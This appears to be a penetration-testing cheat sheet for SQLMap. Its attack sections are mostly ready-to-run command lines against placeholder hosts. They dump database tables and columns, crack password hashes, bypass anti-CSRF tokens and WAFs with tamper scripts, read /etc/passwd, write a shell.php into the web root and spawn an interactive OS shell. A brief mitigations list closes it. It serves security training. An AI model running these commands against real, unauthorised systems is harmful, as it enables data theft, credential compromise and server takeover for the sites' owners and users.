# SQLMap Essentials
## 🎯 Main Idea
- Master SQLMap, the automated tool for detecting and exploiting SQL injection across many DBMS and injection types.
- Goal: go from a request to full DB enumeration, data exfiltration, protection bypass, and OS-level command execution.

## 💥 Attack / Exploit Vectors
### Getting Started / Basic Scan
- Point SQLMap at a URL/parameter and let it detect injection automatically.
- **Commands**
  - `sqlmap -u "http://www.example.com/vuln.php?id=1" --batch` — run without prompting for input
  - `sqlmap -h` / `sqlmap -hh` — basic / advanced help menu
### Running on an HTTP Request
- Feed SQLMap POST data, cookies, methods, or full captured requests; mark the injection point with `*`.
- **Commands**
  - `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'` — POST request
  - `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'` — mark injection point with asterisk
  - `sqlmap -r req.txt` — load a saved HTTP request file
  - `sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'` — specify a cookie header
  - `sqlmap -u www.target.com --data='id=1' --method PUT` — specify HTTP method
### Handling Errors / Debugging
- Increase visibility and capture traffic to diagnose failed detections.
- **Commands**
  - `sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt` — store traffic to a file
  - `sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch` — set verbosity level
### Attack Tuning
- Adjust payload wrapping and detection aggressiveness to find trickier injections.
- **Commands**
  - `sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"` — custom prefix/suffix for the payload
  - `sqlmap -u www.example.com/?id=1 -v 3 --level=5` — raise level (and risk) for more tests
### Database Enumeration
- Pull banner, users, DBs, tables, and dump rows.
- **Commands**
  - `sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba` — basic DB enumeration
  - `sqlmap -u "http://www.example.com/?id=1" --tables -D testdb` — enumerate tables in a database
  - `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname` — dump specific columns
  - `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"` — conditional dump
### Advanced Enumeration
- Dump full schema, search for data, and crack password hashes.
- **Commands**
  - `sqlmap -u "http://www.example.com/?id=1" --schema` — enumerate full DB schema
  - `sqlmap -u "http://www.example.com/?id=1" --search -T user` — search for tables/columns by name
  - `sqlmap -u "http://www.example.com/?id=1" --passwords --batch` — enumerate and crack password hashes
### Bypassing Web Application Protections
- Defeat anti-CSRF tokens, unique/calculated params, and WAFs using tamper scripts.
- **Commands**
  - `sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"` — anti-CSRF token bypass
  - `sqlmap --list-tampers` — list all tamper scripts (also `--tamper=<script>` to apply, `--random-agent` for UA blacklisting)
### OS Exploitation
- Use DBA privileges to read/write files and get command execution / a shell.
- **Commands**
  - `sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba` — check for DBA privileges
  - `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"` — read a local file
  - `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"` — write a file to the server
  - `sqlmap -u "http://www.example.com/?id=1" --os-shell` — spawn an interactive OS shell

## 🛠️ Key Tools & Concepts
- SQLMap — automated SQLi detection/exploitation tool
- Injection types — boolean-based blind, error-based, UNION query-based, stacked queries, time-based blind, inline, out-of-band
- `--level` / `--risk` — control breadth and aggressiveness of tests
- Tamper scripts — payload mutators to evade WAFs/filters
- `--batch` — non-interactive mode (accept defaults)
- Proxy / `--proxy` and traffic logging — for debugging and routing through Burp

## 🛡️ Mitigations
- Use parameterized queries and least-privilege DB accounts (no DBA / FILE rights)
- Deploy a WAF and anti-CSRF tokens (though SQLMap can bypass many of these)
